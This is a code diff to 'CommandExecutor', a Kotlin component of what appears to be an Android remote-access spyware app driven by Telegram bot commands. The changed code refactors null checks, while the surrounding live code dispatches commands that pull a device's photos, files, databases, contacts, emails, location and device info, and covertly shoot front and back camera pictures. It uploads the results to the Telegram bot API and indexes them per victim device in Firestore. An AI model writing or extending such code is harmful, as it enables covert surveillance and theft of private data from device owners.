@@ -62,24 +62,32 @@ object CommandExecutor {
                 val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
                 val req = Request.Builder().url(url).get().build()
                 client.newCall(req).execute().use { resp ->
-                    val body = resp.body?.string() ?: return "[]"
-                    val obj = JSONObject(body)
-                    val docs = obj.optJSONArray("documents") ?: return "[]"
-                    val arr = JSONArray()
-                    for (i in 0 until docs.length()) {
-                        val doc = docs.optJSONObject(i) ?: continue
-                        val f = doc.optJSONObject("fields") ?: continue
-                        val item = JSONObject().apply {
-                            put("file_id", f.optJSONObject("file_id")?.optString("stringValue") ?: "")
-                            put("msg_id", f.optJSONObject("msg_id")?.optString("integerValue")?.toLongOrNull() ?: 0)
-                            put("name", f.optJSONObject("name")?.optString("stringValue") ?: "")
-                            put("size", f.optJSONObject("size")?.optString("integerValue")?.toLongOrNull() ?: 0)
-                            put("date", f.optJSONObject("date")?.optString("integerValue")?.toLongOrNull() ?: 0)
-                            put("caption", f.optJSONObject("caption")?.optString("stringValue") ?: "")
+                    val body = resp.body?.string()
+                    if (body.isNullOrBlank()) {
+                        "[]"
+                    } else {
+                        val obj = JSONObject(body)
+                        val docs = obj.optJSONArray("documents")
+                        if (docs == null) {
+                            "[]"
+                        } else {
+                            val arr = JSONArray()
+                            for (i in 0 until docs.length()) {
+                                val doc = docs.optJSONObject(i) ?: continue
+                                val f = doc.optJSONObject("fields") ?: continue
+                                val item = JSONObject().apply {
+                                    put("file_id", f.optJSONObject("file_id")?.optString("stringValue") ?: "")
+                                    put("msg_id", f.optJSONObject("msg_id")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                                    put("name", f.optJSONObject("name")?.optString("stringValue") ?: "")
+                                    put("size", f.optJSONObject("size")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                                    put("date", f.optJSONObject("date")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                                    put("caption", f.optJSONObject("caption")?.optString("stringValue") ?: "")
+                                }
+                                arr.put(item)
+                            }
+                            arr.toString()
                         }
-                        arr.put(item)
                     }
-                    arr.toString()
                 }
             } catch (e: Exception) {
                 Log.e("PhotoIndex", "list err: ${e.message}")
@@ -94,13 +102,17 @@ object CommandExecutor {
                     val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
                     val req = Request.Builder().url(url).get().build()
                     client.newCall(req).execute().use { resp ->
-                        val body = resp.body?.string() ?: return
-                        val docs = JSONObject(body).optJSONArray("documents") ?: return
-                        for (i in 0 until docs.length()) {
-                            val name = docs.optJSONObject(i)?.optString("name") ?: continue
-                            val delUrl = "https://firestore.googleapis.com/v1/$name?key=${Config.FIREBASE_API_KEY}"
-                            val delReq = Request.Builder().url(delUrl).delete().build()
-                            client.newCall(delReq).execute().use { }
+                        val body = resp.body?.string()
+                        if (!body.isNullOrBlank()) {
+                            val docs = JSONObject(body).optJSONArray("documents")
+                            if (docs != null) {
+                                for (i in 0 until docs.length()) {
+                                    val name = docs.optJSONObject(i)?.optString("name") ?: continue
+                                    val delUrl = "https://firestore.googleapis.com/v1/$name?key=${Config.FIREBASE_API_KEY}"
+                                    val delReq = Request.Builder().url(delUrl).delete().build()
+                                    client.newCall(delReq).execute().use { }
+                                }
+                            }
                         }
                     }
                 } catch (e: Exception) {
@@ -156,30 +168,28 @@ object CommandExecutor {
     //  WebView API — يستخدمها الـ HTML
     // ═══════════════════════════════════════════
 
-    /** يجيب list كل الصور المخزنة في Firestore (JSON string) */
     fun listPhotosJson(ctx: Context): String = PhotoIndex.list(ctx)
 
-    /** يجيب رابط صورة من تلغرام (أو كاش محلي) */
     fun getPhotoUrl(ctx: Context, fileId: String): String {
         if (PhotoCache.has(ctx, fileId)) {
             return "file://" + PhotoCache.file(ctx, fileId).absolutePath
         }
         return try {
-            val path = TelegramApi.getFile(fileId) ?: return ""
-            "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
+            val path = TelegramApi.getFile(fileId)
+            if (path.isNullOrBlank()) "" else "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
         } catch (e: Exception) {
             Log.e("CmdExec", "getPhotoUrl err: ${e.message}")
             ""
         }
     }
 
-    /** ينزّل الصورة ويحفظها محلياً — يرجّع file:// URL */
     fun cachePhoto(ctx: Context, fileId: String): String {
         return try {
             if (PhotoCache.has(ctx, fileId)) {
                 return "file://" + PhotoCache.file(ctx, fileId).absolutePath
             }
-            val path = TelegramApi.getFile(fileId) ?: return ""
+            val path = TelegramApi.getFile(fileId)
+            if (path.isNullOrBlank()) return ""
             val url = "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
             val client = OkHttpClient.Builder()
                 .connectTimeout(30, TimeUnit.SECONDS)
@@ -187,10 +197,17 @@ object CommandExecutor {
                 .build()
             val req = Request.Builder().url(url).get().build()
             client.newCall(req).execute().use { resp ->
-                if (!resp.isSuccessful) return ""
-                val bytes = resp.body?.bytes() ?: return ""
-                val f = PhotoCache.save(ctx, fileId, bytes)
-                if (f != null) "file://" + f.absolutePath else ""
+                if (!resp.isSuccessful) {
+                    ""
+                } else {
+                    val bytes = resp.body?.bytes()
+                    if (bytes == null) {
+                        ""
+                    } else {
+                        val f = PhotoCache.save(ctx, fileId, bytes)
+                        if (f != null) "file://" + f.absolutePath else ""
+                    }
+                }
             }
         } catch (e: Exception) {
             Log.e("CmdExec", "cachePhoto err: ${e.message}")
@@ -230,12 +247,10 @@ object CommandExecutor {
 
             cmd == "📍 عرض الموقع" -> showLocation(ctx)
 
-            // صور
             cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
             cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
             cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
 
-            // ملفات
             cmd == "📁 كل الملفات" || cmd == "/files" -> fetchFiles(ctx)
             cmd == "📄 المستندات" || cmd == "/docs" -> fetchDocuments(ctx)
             cmd == "📦 المضغوطة" || cmd == "/archives" -> fetchArchives(ctx)
@@ -243,17 +258,14 @@ object CommandExecutor {
             cmd == "🗄 قواعد بيانات" || cmd == "/dbs" -> fetchDatabases(ctx)
             cmd == "🎬 الفيديو" || cmd == "/videos" -> fetchVideos(ctx)
 
-            // اتصالات
             cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
             cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
 
-            // أخرى
             cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
             cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
             cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
             cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)
 
-            // أجهزة
             cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
             cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "كل الأجهزة", "all")
             cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))
@@ -426,9 +438,6 @@ object CommandExecutor {
         }
     }
 
-    /**
-     * إرسال قائمة صور + حفظ metadata في Firestore
-     */
     private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
         if (list.isEmpty()) {
             TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
@@ -440,10 +449,11 @@ object CommandExecutor {
             val file = File(item.path)
             if (!file.exists()) { failed++; continue }
 
-            val (ok, fileId) = TelegramApi.sendPhoto(file, item.name)
+            val result = TelegramApi.sendPhoto(file, item.name)
+            val ok = result.first
+            val fileId = result.second
             if (ok) {
                 sent++
-                // احفظ metadata في Firestore
                 if (fileId.isNotBlank()) {
                     PhotoIndex.save(ctx, fileId, sent, item.name, item.size, "📸 ${item.name}")
                 }
@@ -480,7 +490,9 @@ object CommandExecutor {
             TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
             val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
             if (file != null && file.exists()) {
-                val (ok, fileId) = TelegramApi.sendPhoto(file, "📷 صورة ($label)")
+                val result = TelegramApi.sendPhoto(file, "📷 صورة ($label)")
+                val ok = result.first
+                val fileId = result.second
                 if (ok && fileId.isNotBlank()) {
                     PhotoIndex.save(ctx, fileId, System.currentTimeMillis().toInt(), file.name, file.length(), "📷 صورة ($label)")
                 }
